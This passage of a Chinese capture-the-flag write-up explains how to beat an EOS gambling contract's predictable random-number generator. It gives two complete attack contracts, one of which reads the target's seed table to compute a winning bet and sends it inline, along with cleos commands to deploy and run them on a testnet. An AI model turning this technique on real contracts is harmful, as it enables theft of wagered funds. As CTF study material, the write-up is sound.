          i32.const 0
          i32.const 8352
          call $env.eosio_assert
        end
        get_local $l1
        get_local $l2
        get_local $l3
        get_local $l0
        call $f81                            ;; 
    #include 
    #define TARGET_ACCOUNT "de1ctftest11"
    using namespace eosio;
    class [[eosio::contract]] attack : public contract {
      private:
        int random(int oldseed, const int range){
          // Generate new seed value using the existing seed value
          int prime = 65537;
          auto new_seed_value = (oldseed + (uint32_t)(eosio::current_time_point().sec_since_epoch())) % prime;
          // Get the random result in desired range
          int random_result = new_seed_value % range;
          return random_result;
        }
      public:
        using contract::contract;
        attack( name receiver, name code, datastream ds ):contract(receiver, code, ds){}
        [[eosio::action]]
        void makebet(int oldseed)
        {
          // Ensure this action is authorized by the player
          require_auth(get_self());
          int random_num = random(oldseed, 5);
          print("make bet ", random_num);
          action(
            permission_level{get_self(),"active"_n},  //所需要的权限结构
            name(TARGET_ACCOUNT),                          // 调用的合约名称
            "bet"_n,                              // 合约的方法
            std::make_tuple(get_self(), random_num) // 传递的参数
          ).send();
        }
    };
编译合约、抵押 RAM、部署合约、调整合约 eosio.code
权限等过程限于篇幅这里省略，建议大家在官网上学习并自行google，我这里就简单给命令介绍了
    # 编译 attack.cpp 获得 attack.wasm 以及 attack.abi
    eosio-cpp attack.cpp 
    # 抵押 RAM
    cleos -u http://jungle2.cryptolions.io:80 system buyram aaatester123 aaatester123 "10.0000 EOS" 
    # 部署合约，这里使用 -u 指定一个全节点就不需要自己跑链了
    cleos -u http://jungle2.cryptolions.io:80 set contract aaatester123 ./attack
    # 调整 eosio.code 权限
    cleos -u http://jungle2.cryptolions.io:80 set account permission aaatester123 active  
    '{"threshold" : 1, "keys" : [{"key":"你选的EOS公钥","weight":1}], 
    "accounts" : [{"permission":{"actor":"aaatester123","permission":"eosio.code"},"weight":1}]}' owner  
    -p aaatester123@owner
如果你以及通过了官网上的初步测试，则应该已经了解了 EOS 合约下的结构，这里我重复介绍以下
    #include    // 核心库函数
    using namespace eosio;
    class [[eosio::contract]] attack : public contract {
    public:
        [[eosio::action]]
        {...}
    }
这里在 public 关键字下由 [[eosio::action]] 作为标记的函数就是对外暴露可调用的函数，类似于以太坊下的 public
function；我们看这个攻击合约内有唯一的可调用函数 makebet，其接收一个 int 类型的参数，即目标合约现有的 seed
值，我们一样可以在区块链浏览器上找到该值
函数的功能还是很显而易见的，就是基于传入的 oldseed 计算新的 seed 并向目标合约发交易，稍微要啰嗦的就是 EOS 中合约发送 inline
交易的代码要写成这样，相比 以太坊 中的 send 和 call 还是麻烦了很多，可以参考官网部分
    action(
            //permission_level,
            //code,
            //action,
            //data
          ).send();
其中参数啥的还是自己取搜清楚把；接下来我们调用部署的合约；
    # 已知现在的 seed value 为 45587，那么传入参数为 45587
    cleos -u http://jungle2.cryptolions.io:80 push action aaatester123 makebet '{"oldseed":45587}' -p aaatester123@active
    # 返回
    # executed transaction: f672ad16a8f40d9f96a56b2eaabd4b719e2ae4c66aed0a9bf5bae8e9fc481219  96 bytes  206 us
    #  aaatester123 > make bet 0
    #  de1ctftest11 
    #include 
    #define TARGET_ACCOUNT "de1ctftest11"
    using namespace eosio;
    class [[eosio::contract]] attack : public contract {
      private:
        struct [[eosio::table]] seed {
          uint64_t        key = 1;
          uint32_t        value = 1;
          auto primary_key() const { return key; }
        };
        typedef eosio::multi_index seed_table;
        seed_table _seed;
        int random(const int range){
          // Find the existing seed
          auto seed_iterator = _seed.begin();
          // Initialize the seed with default value if it is not found
          if (seed_iterator == _seed.end()) {
            seed_iterator = _seed.emplace( _self, [&]( auto& seed ) { });
          }
          // Generate new seed value using the existing seed value
          int prime = 65537;
          auto new_seed_value = (seed_iterator->value + (uint32_t)(eosio::current_time_point().sec_since_epoch())) % prime;
          // Get the random result in desired range
          int random_result = new_seed_value % range;
          return random_result;
        }
      public:
        using contract::contract;
        attack( name receiver, name code, datastream ds ):contract(receiver, code, ds),
                           _seed(eosio::name(TARGET_ACCOUNT), eosio::name(TARGET_ACCOUNT).value) {}
        [[eosio::action]]
        void makebet()
        {
          // Ensure this action is authorized by the player
          require_auth(get_self());
          int random_num = random(5);
          print("make bet ", random_num);
          action(
            permission_level{get_self(),"active"_n},  //所需要的权限结构
            name(TARGET_ACCOUNT),                          // 调用的合约名称
            "bet"_n,                              // 合约的方法
            std::make_tuple(get_self(), random_num) // 传递的参数
          ).send();
        }
    };
该合约最大的不同是引入了 multi_index 表，简单来说就是直接在运行时查询 seed
的value而不用我们人工去查了，虽然显得复杂一些，但其原理还是比较简单，table等相关知识也在官网中有详细介绍，类似于以太坊中的 map 结构。
另外一种基于回滚攻击的方法我们放到另文介绍，感谢阅读😄